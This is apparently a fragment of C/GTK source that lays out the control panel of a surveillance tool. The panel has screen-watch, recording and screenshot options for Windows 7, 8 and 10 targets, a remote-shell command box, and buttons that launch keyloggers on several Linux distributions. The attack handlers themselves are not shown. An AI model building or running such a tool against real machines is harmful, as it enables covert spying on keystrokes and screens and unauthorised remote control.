    windows8_tab_label  = g_strdup_printf("Windows 8");
    windows10_tab_label = g_strdup_printf("Windows 10");

    windows_tab_label[0] = gtk_label_new(windows7_tab_label);
    windows_tab_label[1] = gtk_label_new(windows8_tab_label);
    windows_tab_label[2] = gtk_label_new(windows10_tab_label);

    /* Insert tab pages */
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[0], windows_tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[1], windows_tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[2], windows_tab_label[2]);

    /* Insert background color on each tabs */
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows_BG_logo[0], 0, 0);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows_BG_logo[1], 0, 0);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows_BG_logo[2], 0, 0);

    /* Windows 7 tab */
    windows7_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Windows 8 tab */
    windows8_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Windows 10 tab */
    windows10_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Cmd text labels */
    windows7_label_watch = gtk_label_new(NULL);
    windows7_label_record = gtk_label_new(NULL);
    windows7_label_screenshot = gtk_label_new(NULL);
    windows7_label_multi_screenshot = gtk_label_new(NULL);

    windows8_label_watch = gtk_label_new(NULL);
    windows8_label_record = gtk_label_new(NULL);
    windows8_label_screenshot = gtk_label_new(NULL);
    windows8_label_multi_screenshot = gtk_label_new(NULL);

    windows10_label_watch = gtk_label_new(NULL);
    windows10_label_record = gtk_label_new(NULL);
    windows10_label_screenshot = gtk_label_new(NULL);
    windows10_label_multi_screenshot = gtk_label_new(NULL);

    gtk_label_set_markup(GTK_LABEL(windows7_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows7_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows7_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows7_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(windows8_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows8_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows8_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows8_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(windows10_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows10_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows10_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows10_label_multi_screenshot), utf8_multi_screenshot);

    /* Windows7 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_multi_screenshot, 40, 115);

    /* Windows8 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_multi_screenshot, 40, 115);

    /* Windows10 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_multi_screenshot, 40, 115);

    g_free(utf8_watch);
    g_free(utf8_record);
    g_free(utf8_screenshot);
    g_free(utf8_multi_screenshot);

    /* Frame 4 (Remote Shell) */
    frame[4] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[4]), "- Remote Shell - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[4]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[4]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[4], 540, 200);
    gtk_fixed_put(GTK_FIXED(zone), frame[4], 250, 220);

    /* GtkEntry for enter the commands */
    rs_entry = gtk_entry_new_with_max_length(256);
    gtk_entry_set_text(GTK_ENTRY(rs_entry), "Enter a command here");
    gtk_widget_set_size_request (rs_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_entry, 270, 260);

    /* Start Remote Shell Button */
    rs_start =  gtk_button_new_with_label("Start the Remote Shell");
    gtk_widget_set_size_request(rs_start, 180, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_start, 300, 310);
    g_signal_connect(G_OBJECT(rs_start), "clicked", G_CALLBACK(start_remote_shell), NULL);

    /* Send button */
    rs_send = gtk_button_new_with_label("Send");
    gtk_widget_set_size_request(rs_send, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_send, 520, 260);
    g_signal_connect(G_OBJECT(rs_send), "clicked", G_CALLBACK(send_cmd), rs_entry);

    /* Frame 5 (KeyLogger) */
    frame[5] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[5]), "- KeyLogger - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[5]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[5]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[5], 230, 370);
    gtk_fixed_put(GTK_FIXED(zone), frame[5], 10, 220);

    run_keylogger = gtk_button_new_with_label("Ubuntu Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 260);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(ubuntu_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Mint Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 300);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(mint_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Debian Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 340);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(debian_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Kali Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 380);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(kali_run_the_keylogger), NULL);

    log_file = gtk_button_new_with_label("Logs file");
    gtk_widget_set_size_request(log_file, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_file, 50, 530);
    g_signal_connect(G_OBJECT(log_file), "clicked", G_CALLBACK(open_log_file), NULL);

    gtk_widget_show_all(main_win);

    return;

}
